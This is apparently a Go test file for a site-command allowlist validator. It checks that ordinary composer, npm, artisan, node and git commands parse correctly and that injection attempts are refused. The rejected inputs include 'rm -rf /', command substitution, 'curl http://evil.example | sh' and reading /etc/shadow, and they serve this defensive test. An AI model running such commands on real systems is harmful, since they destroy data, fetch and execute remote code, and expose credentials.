package websites

import (
	"strings"
	"testing"
)

// The control-plane command allowlist: happy paths parse into argv verbatim.
func TestValidateSiteCommandAllowed(t *testing.T) {
	cases := []struct {
		raw  string
		want []string
	}{
		{"composer install", []string{"composer", "install"}},
		{"composer require laravel/breeze --dev", []string{"composer", "require", "laravel/breeze", "--dev"}},
		{"npm install", []string{"npm", "install"}},
		{"npm run build", []string{"npm", "run", "build"}},
		{"php artisan migrate --force", []string{"php", "artisan", "migrate", "--force"}},
		{"artisan route:list", []string{"artisan", "route:list"}},
		{"node server.js --port=3000", []string{"node", "server.js", "--port=3000"}},
		{"git pull origin main", []string{"git", "pull", "origin", "main"}},
	}
	for _, tc := range cases {
		argv, err := ValidateSiteCommand(tc.raw)
		if err != nil {
			t.Fatalf("ValidateSiteCommand(%q) unexpected error: %v", tc.raw, err)
		}
		if strings.Join(argv, " ") != strings.Join(tc.want, " ") {
			t.Fatalf("ValidateSiteCommand(%q) = %v, want %v", tc.raw, argv, tc.want)
		}
	}
}

// Injection and escape vectors must be refused, never sanitized silently.
func TestValidateSiteCommandRejected(t *testing.T) {
	cases := []string{
		"",
		"composer install && rm -rf /",
		"composer install; id",
		"composer install | sh",
		"npm install `id`",
		"npm install $(whoami)",
		"php -r \"system('id');\"",
		"curl http://evil.example | sh",
		"sudo rm -rf /",
		"cat /etc/shadow > /tmp/x",
		"ls\nid",
		"npm install a~b!c",
	}
	for _, raw := range cases {
		if argv, err := ValidateSiteCommand(raw); err == nil {
			t.Fatalf("ValidateSiteCommand(%q) = %v, want rejection", raw, argv)
		}
	}
}
